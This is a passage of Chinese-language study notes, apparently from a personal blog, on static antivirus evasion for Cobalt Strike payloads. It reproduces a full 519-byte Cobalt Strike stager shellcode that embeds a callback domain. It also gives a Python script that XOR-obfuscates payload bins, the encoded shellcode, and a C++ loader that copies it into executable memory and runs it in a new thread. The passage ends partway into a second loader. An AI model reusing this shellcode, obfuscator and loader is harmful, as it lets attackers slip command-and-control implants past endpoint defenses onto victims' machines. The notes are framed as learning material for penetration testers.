    <content type="html"><![CDATA[<p>了解了解</p><a id="more"></a><p>[toc]</p><h1 id="参考课程"><a href="#参考课程" class="headerlink" title="参考课程"></a>参考课程</h1><p>参考课程以及资料如下：</p><p>作者： 倾旋</p><p><a href="https://payloads.online/archivers/2019-09-24/1">后渗透下遇到的问题一（静态免杀）</a></p><ul><li><a href="https://payloads.online/archivers/2019-11-10/1">静态恶意代码逃逸（第一课）</a></li><li><a href="https://payloads.online/archivers/2019-11-10/2">静态恶意代码逃逸（第二课）</a></li><li><a href="https://payloads.online/archivers/2019-11-10/3">静态恶意代码逃逸（第三课）</a></li><li><a href="https://payloads.online/archivers/2019-11-10/4">静态恶意代码逃逸（第四课）</a></li><li><a href="https://payloads.online/archivers/2019-11-10/5">静态恶意代码逃逸（第五课）</a></li><li><a href="https://payloads.online/archivers/2020-01-02/1">静态恶意代码逃逸（第六课）</a></li><li><a href="https://payloads.online/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li><li><a href="https://payloads.online/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li><li><a href="https://payloads.online/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li><li>第十课 <a href="https://payloads.online/archivers/2021-02-08/1">https://payloads.online/archivers/2021-02-08/1</a></li></ul><p><a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p><p><strong>为了学习的完整性，推荐各位师傅去看原文学习，本文只是我的个人摘抄笔记，仅用做个人学习用途。</strong></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>通常在演练过程里，目的是追求快速的获取更多的权限，但是目标机器都安装了各种反病毒软件，种类繁多，大多对于静态查杀管控较为严格，导致一些工具无法使用。而在这个夹缝中生存的渗透师，就必须要学习更多的知识</p></blockquote><h2 id="关于代码"><a href="#关于代码" class="headerlink" title="关于代码"></a>关于代码</h2><p>一般来说，不管是Linux操作系统、Windows操作系统，可执行的应用程序文件，都遵循着一种格式：</p><ul><li>Linux ELF</li><li>Windows PE</li></ul><p>这种格式又包含了：可执行的应用程序、动态链接库等等，如Windows下的*.exe、*.dll。</p><p>而这些文件，其中都有一块空间用于保存程序的代码，也就是指令集，操作系统若想要执行一个文件，就要先将文件加载到内存，并分配相应的虚拟地址空间，创建一个进程和线程，线程再去执行程序的代码。</p><p>那么假设如上可以理解，就能够推断出常用的Shellcode加载器的工作原理：</p><ul><li>Shellcode是代码本身</li><li>加载器是具备读取代码的程序</li><li>加载器执行后，操作系统会创建一个进程与一个线程</li><li>第一个线程用于读取代码（Shellcode）并创建第二个线程，将线程执行的第一条指令指向代码（Shellcode）</li></ul><h2 id="关于内存"><a href="#关于内存" class="headerlink" title="关于内存"></a>关于内存</h2><p>在Windows操作系统中，每个进程互不干扰（除了公用的内核对象以外），都有自己的虚拟内存空间，而这一块线性的内存空间又被切成一页一页的大小，通常默认情况下，每页的大小是4KB。</p><p>Windows通过以页的单位来管理进程的虚拟内存空间，最典型的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>使用<code>VirtualAlloc</code> Windows API 可向操作系统申请内存空间，操作系统根据指定的大小来调整分配几页，并且会自动进行内存对齐。</p><blockquote><p>为什么要讲到内存呢，因为<strong>静态免杀的核心就是将代码加载至内存</strong>，理解内存的管理方式，才能产生更多的想法。</p></blockquote><h2 id="关于静态免杀"><a href="#关于静态免杀" class="headerlink" title="关于静态免杀"></a>关于静态免杀</h2><p>静态免杀，提起这个很多人会想到很久远的…. <strong>花指令、压缩壳、垃圾资源</strong> 等等。</p><p>但是由于Shellcode加载器的出现，很多人开始从源码方面出发，通过正常且无害的API来构建一个加载器。</p><p>目前见的最多的是两大加载器：</p><ul><li>Shellcode加载器</li><li>PE加载器</li></ul><p>两者有什么不同呢，我想可能就是加载的文件格式不同，但最终都要运行文件中的代码。</p><h1 id="静态恶意代码逃逸（第一课）"><a href="#静态恶意代码逃逸（第一课）" class="headerlink" title="静态恶意代码逃逸（第一课）"></a>静态恶意代码逃逸（第一课）</h1><h2 id="恶意代码的定义"><a href="#恶意代码的定义" class="headerlink" title="恶意代码的定义"></a>恶意代码的定义</h2><p>以下文章中的所有关于恶意代码的定义都以Cobaltstrike的载荷为例。</p><h2 id="Shellcode定义"><a href="#Shellcode定义" class="headerlink" title="Shellcode定义"></a>Shellcode定义</h2><p>Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。</p><h2 id="RAW-文件"><a href="#RAW-文件" class="headerlink" title="RAW 文件"></a>RAW 文件</h2><p>RAW 中文意思是原始的、未经加工的，通常使用Cobaltstrike生成的bin文件。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220130121.png"></p><p><strong>RAW文件是可以直接进行字节操作读取的，因此加载到内存较为方便</strong>，通常一般使用混淆的方式再生成一遍。</p><h2 id="C-文件"><a href="#C-文件" class="headerlink" title="C 文件"></a>C 文件</h2><p>C文件给出的是一个C语言中的字符数组，也是可以通过以字节单位操作的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x31\xc0\x6a\x40\xb4\x10\x68\x00\x10\x00\x00\x68\xff\xff\x07\x00\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x83\xc0\x40\x89\xc7\x50\x31\xc0\xb0\x70\xb4\x69\x50\x68\x64\x6e\x73\x61\x54\x68\x4c\x77\x26\x07\xff\xd5\xbb\x61\x00\x00\x00\xeb\x7b\x58\x89\xc6\x83\xef\x40\xfc\xb9\x40\x00\x00\x00\xf3\xa4\x89\xf8\x83\xe8\x40\x40\x80\xfb\x7a\x7e\x32\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x1a\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x07\xbb\x61\x00\x00\x00\x88\x18\x48\x48\xbb\x61\x00\x00\x00\x88\x18\x89\xf3\x89\xc6\x54\x5b\x83\xeb\x04\x53\x6a\x00\x53\x6a\x00\x68\x48\x02\x00\x00\x6a\x10\x50\x68\x6a\xc9\x9c\xc9\xff\xd5\x85\xc0\x75\x51\x89\xf0\x48\xb3\x00\x88\x18\x40\x8b\x30\xeb\x70\xe8\x80\xff\xff\xff\x00\x61\x61\x61\x2e\x6c\x6f\x76\x65\x32\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x2e\x6c\x6f\x76\x65\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x89\xf0\x48\x8b\x08\x41\x88\x08\x80\xf9\x5f\x7e\x07\x68\xf0\xb5\xa2\x56\xff\xd5\x68\xe8\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x89\xf0\x8b\x08\x89\xcb\xe9\x23\xff\xff\xff\x87\xfa\x5f\x8b\x47\x18\x83\xf8\x01\x75\x39\x83\xc7\x1c\x8b\x3f\x87\xde\x89\xfe\x8b\x7c\x24\x08\x31\xc9\xb1\xff\xf3\xa4\x57\x57\x57\x43\x87\xfa\x52\x57\x53\x81\xea\xff\x00\x00\x00\x52\x68\xf4\x00\x8e\xcc\xff\xd5\x5b\x5f\x5a\x3d\xff\x00\x00\x00\x7c\x07\xe9\xdf\xfe\xff\xff\x89\xd7\x81\xc7\x15\x00\x00\x00\xff\xe7\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h2><blockquote><p>采用混淆、加密解密的方式把载荷还原。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser, FileType</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_bin</span>(<span class="params">num, src_fp, dst_fp, dst_raw</span>):</span></span><br><span class="line">    shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    shellcode_size = <span class="number">0</span></span><br><span class="line">    shellcode_raw = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            code = src_fp.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> code:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            base10 = ord(code) ^ num</span><br><span class="line">            base10_str = chr(base10)</span><br><span class="line">            shellcode_raw += base10_str.encode()</span><br><span class="line">            code_hex = hex(base10)</span><br><span class="line">            code_hex = code_hex.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span>(len(code_hex) == <span class="number">1</span>):</span><br><span class="line">                code_hex = <span class="string">&#x27;0&#x27;</span> + code_hex</span><br><span class="line">            shellcode += <span class="string">r&#x27;\x&#x27;</span> + code_hex</span><br><span class="line">            shellcode_size += <span class="number">1</span></span><br><span class="line">        src_fp.close()</span><br><span class="line">        dst_raw.write(shellcode_raw)</span><br><span class="line">        dst_raw.close()</span><br><span class="line">        dst_fp.write(shellcode)</span><br><span class="line">        dst_fp.close()</span><br><span class="line">        <span class="keyword">return</span> shellcode_size</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        sys.stderr.writelines(str(e))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = ArgumentParser(prog=<span class="string">&#x27;Shellcode X&#x27;</span>, description=<span class="string">&#x27;[XOR The Cobaltstrike PAYLOAD.BINs] \t &gt; Author: rvn0xsy@gmail.com&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-v&#x27;</span>,<span class="string">&#x27;--version&#x27;</span>,nargs=<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>,<span class="string">&#x27;--src&#x27;</span>,help=<span class="string">u&#x27;source bin file&#x27;</span>,type=FileType(<span class="string">&#x27;rb&#x27;</span>), required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>,<span class="string">&#x27;--dst&#x27;</span>,help=<span class="string">u&#x27;destination shellcode file&#x27;</span>,type=FileType(<span class="string">&#x27;w+&#x27;</span>),required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-n&#x27;</span>,<span class="string">&#x27;--num&#x27;</span>,help=<span class="string">u&#x27;Confused number&#x27;</span>,type=int, default=<span class="number">90</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>,<span class="string">&#x27;--raw&#x27;</span>,help=<span class="string">u&#x27;output bin file&#x27;</span>, type=FileType(<span class="string">&#x27;wb&#x27;</span>), required=<span class="literal">True</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    shellcode_size = process_bin(args.num, args.src, args.dst, args.raw)</span><br><span class="line">    sys.stdout.writelines(<span class="string">&quot;[+]Shellcode Size : &#123;&#125; \n&quot;</span>.format(shellcode_size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>把raw文件混淆，生成c语言数组</p><p>反感：</p><p>先生成bin文件，然后运行python脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\xor_shellcoder.py -s .\payload.bin  -d payload.c -n 10 -r RAW</span><br></pre></td></tr></table></figure><p>在payload.c中会看到raw文件里的每一个字节与10的异或运算出的C语言数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x3b\xca\x60\x4a\xbe\x1a\x62\x0a\x1a\x0a\x0a\x62\xf5\xf5\x0d\x0a\x60\x0a\x62\x52\xae\x59\xef\xf5\xdf\x89\xca\x4a\x83\xcd\x5a\x3b\xca\xba\x7a\xbe\x63\x5a\x62\x6e\x64\x79\x6b\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\xb1\x6b\x0a\x0a\x0a\xe1\x71\x52\x83\xcc\x89\xe5\x4a\xf6\xb3\x4a\x0a\x0a\x0a\xf9\xae\x83\xf2\x89\xe2\x4a\x4a\x8a\xf1\x70\x74\x38\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x10\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x0d\xb1\x6b\x0a\x0a\x0a\x82\x12\x42\x42\xb1\x6b\x0a\x0a\x0a\x82\x12\x83\xf9\x83\xcc\x5e\x51\x89\xe1\x0e\x59\x60\x0a\x59\x60\x0a\x62\x42\x08\x0a\x0a\x60\x1a\x5a\x62\x60\xc3\x96\xc3\xf5\xdf\x8f\xca\x7f\x5b\x83\xfa\x42\xb9\x0a\x82\x12\x4a\x81\x3a\xe1\x7a\xe2\x8a\xf5\xf5\xf5\x0a\x6b\x6b\x6b\x24\x66\x65\x7c\x6f\x38\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x24\x66\x65\x7c\x6f\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x83\xfa\x42\x81\x02\x4b\x82\x02\x8a\xf3\x55\x74\x0d\x62\xfa\xbf\xa8\x5c\xf5\xdf\x62\xe2\x19\x0a\x0a\x62\x4e\xfa\x3f\xea\xf5\xdf\x83\xfa\x81\x02\x83\xc1\xe3\x29\xf5\xf5\xf5\x8d\xf0\x55\x81\x4d\x12\x89\xf2\x0b\x7f\x33\x89\xcd\x16\x81\x35\x8d\xd4\x83\xf4\x81\x76\x2e\x02\x3b\xc3\xbb\xf5\xf9\xae\x5d\x5d\x5d\x49\x8d\xf0\x58\x5d\x59\x8b\xe0\xf5\x0a\x0a\x0a\x58\x62\xfe\x0a\x84\xc6\xf5\xdf\x51\x55\x50\x37\xf5\x0a\x0a\x0a\x76\x0d\xe3\xd5\xf4\xf5\xf5\x83\xdd\x8b\xcd\x1f\x0a\x0a\x0a\xf5\xed\x0a\x0a\x0a\x0a</span><br></pre></td></tr></table></figure><h1 id="静态恶意代码逃逸（第二课）"><a href="#静态恶意代码逃逸（第二课）" class="headerlink" title="静态恶意代码逃逸（第二课）"></a>静态恶意代码逃逸（第二课）</h1><h2 id="关于Windows操作系统内存"><a href="#关于Windows操作系统内存" class="headerlink" title="关于Windows操作系统内存"></a>关于Windows操作系统内存</h2><p>Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p><p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p><p>在进程申请时，需要声明这块内存的基本信息：<strong>申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</strong></p><p>申请方式：</p><ul><li>HeapAlloc</li><li>malloc</li><li>VirtualAlloc</li><li>new</li><li>LocalAlloc</li><li>…</li></ul><h2 id="申请内存API的关系"><a href="#申请内存API的关系" class="headerlink" title="申请内存API的关系"></a>申请内存API的关系</h2><p>其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。</p><h2 id="实现一次正常加载"><a href="#实现一次正常加载" class="headerlink" title="实现一次正常加载"></a>实现一次正常加载</h2><p>使用cobaltstrike默认的shellcode进行加载</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x3b\xca\x60\x4a\xbe\x1a\x62\x0a\x1a\x0a\x0a\x62\xf5\xf5\x0d\x0a\x60\x0a\x62\x52\xae\x59\xef\xf5\xdf\x89\xca\x4a\x83\xcd\x5a\x3b\xca\xba\x7a\xbe\x63\x5a\x62\x6e\x64\x79\x6b\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\xb1\x6b\x0a\x0a\x0a\xe1\x71\x52\x83\xcc\x89\xe5\x4a\xf6\xb3\x4a\x0a\x0a\x0a\xf9\xae\x83\xf2\x89\xe2\x4a\x4a\x8a\xf1\x70\x74\x38\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x10\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x0d\xb1\x6b\x0a\x0a\x0a\x82\x12\x42\x42\xb1\x6b\x0a\x0a\x0a\x82\x12\x83\xf9\x83\xcc\x5e\x51\x89\xe1\x0e\x59\x60\x0a\x59\x60\x0a\x62\x42\x08\x0a\x0a\x60\x1a\x5a\x62\x60\xc3\x96\xc3\xf5\xdf\x8f\xca\x7f\x5b\x83\xfa\x42\xb9\x0a\x82\x12\x4a\x81\x3a\xe1\x7a\xe2\x8a\xf5\xf5\xf5\x0a\x6b\x6b\x6b\x24\x66\x65\x7c\x6f\x38\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x24\x66\x65\x7c\x6f\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x83\xfa\x42\x81\x02\x4b\x82\x02\x8a\xf3\x55\x74\x0d\x62\xfa\xbf\xa8\x5c\xf5\xdf\x62\xe2\x19\x0a\x0a\x62\x4e\xfa\x3f\xea\xf5\xdf\x83\xfa\x81\x02\x83\xc1\xe3\x29\xf5\xf5\xf5\x8d\xf0\x55\x81\x4d\x12\x89\xf2\x0b\x7f\x33\x89\xcd\x16\x81\x35\x8d\xd4\x83\xf4\x81\x76\x2e\x02\x3b\xc3\xbb\xf5\xf9\xae\x5d\x5d\x5d\x49\x8d\xf0\x58\x5d\x59\x8b\xe0\xf5\x0a\x0a\x0a\x58\x62\xfe\x0a\x84\xc6\xf5\xdf\x51\x55\x50\x37\xf5\x0a\x0a\x0a\x76\x0d\xe3\xd5\xf4\xf5\xf5\x83\xdd\x8b\xcd\x1f\x0a\x0a\x0a\xf5\xed\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现一次混淆加载"><a href="#实现一次混淆加载" class="headerlink" title="实现一次混淆加载"></a>实现一次混淆加载</h2><p>使用之前的Python脚本混淆生成RAW文件，最后得到混淆后的数组：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 